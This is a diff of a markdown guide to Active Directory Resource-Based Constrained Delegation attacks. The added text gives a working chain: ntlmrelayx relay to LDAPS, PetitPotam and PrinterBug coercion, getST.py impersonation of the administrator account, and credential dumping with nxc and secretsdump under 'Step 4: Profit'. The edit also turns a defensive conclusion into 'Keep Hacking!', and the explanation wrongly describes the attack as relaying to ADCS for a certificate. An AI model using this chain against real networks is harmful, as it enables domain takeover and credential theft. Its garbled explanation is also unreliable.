@@ -86,25 +86,65 @@ addcomputer.py -method LDAPS -computer-name 'COMPUTERNAME$' -computer-pass 'Pass
 - `-method`: the method to add the new computer account. It can be:
 	- SAMR to add the account via SMB 
 	- LDAPS. 
-	This is important the default method is SAMR and the account will be created without SPNs.
+	(This is important the default method is SAMR and with SAMR the account will be created without SPNs)
 
 if this succeeds congrats you can continue with the relay.
 ### Step 3: Configure and Launch the RBCD Exploit
 
-Configure your exploit tool according to the target's environment, ensuring you're using the correct:
+RBCD is a relay attack we are going to relay the authentication from one machine to our own using coercion then we are going to relay that authentication attempt to a ADCS and get the certificate then we use that certificate to impersonate the victim account and get the kerberos ticket(TGT).
 
-*   **Service Principal Name (SPN)**: Identify the SPN associated with the vulnerable service.
-*   **User Account**: Specify the user account for which to obtain a TGT.
+![[Relay.png]]
+ 
+Lets start by setting up the relay. We are going to use another Impacket tool called `ntlmrelayx.py`.
 
-Launch the RBCD exploit, and monitor the output as it attempts to authenticate and obtain a ticket-granting ticket.
+```
+./ntlmrelayx.py -smb2support -t ldaps://dc.domain.com --http-port 8080 --delegate-access --escalate-user SPNusername --no-dump --no-acl --no-da --remove-mic
+```
 
-### Step 4: Verify the Exploit's Success
+Let `ntlmrelayx.py` running and attempt authentication. we have two ways for the coercion: 
 
-Verify that the exploit has successfully obtained a TGT by checking:
+- MS-EFSRPC (PetitPotam)  
+- MS-RPRN (PrinterBug)
 
-*   **Ticket Validation**: Confirm that the TGT can be used to access resources constrained by the permissions of the service.
-*   **Access Levels**: Determine the level of access granted by the exploited TGT.
+###### MS-EFSRPC (PetitPotam)
+```
+./PetitPotam.py -d episourcein.episource.com -u 'user' -p 'password' SPNUsername@8080/path victim.domain.com
+```
+
+###### MS-RPRN (PrinterBug)
+
+```
+./printerbug.py domain.com/user:password@victim.domain.com SPNUsername@8080/path
+```
+
+Then we are going to request the Impersonated Service Ticket for this we are going to use another impacket tool called `getSt.py`.
+
+```
+./getST.py -spn cifs/victim.domain.com -impersonate 'administrator' domain.com/SPNusername:'password' -dc-ip <domain_ip> 
+
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+[-] CCache file is not found. Skipping... 
+[*] Getting TGT for user
+[*] Impersonating ldap.
+```
+
+Then we just have one step left retrieve the ticket stored in cache
+
+```
+export KRB5CCNAME=/yourpath/domainAdmin.ccache
+```
+### Step 4: Profit
+
+Now you can use this kerberos credentials to do whatever you want enumerate, dump creds, etc ...
+
+```
+nxc smb victim.domain.com --use-kcache --sam 
+```
+
+```
+./secretsdump.py -k -no-pass victim.domain.com
+```
 
 ## Conclusion
 
-Mastering RBCD exploitation requires in-depth knowledge of Kerberos and Windows-specific protocols. By understanding how attackers can misuse RBCD vulnerabilities, you'll be better equipped to protect your organization's infrastructure from unauthorized access.
+Hope this guide help you get some Domain Accounts, By understanding how you can misuse RBCD vulnerabilities, you'll be better equipped to pawn more things. Keep Hacking!
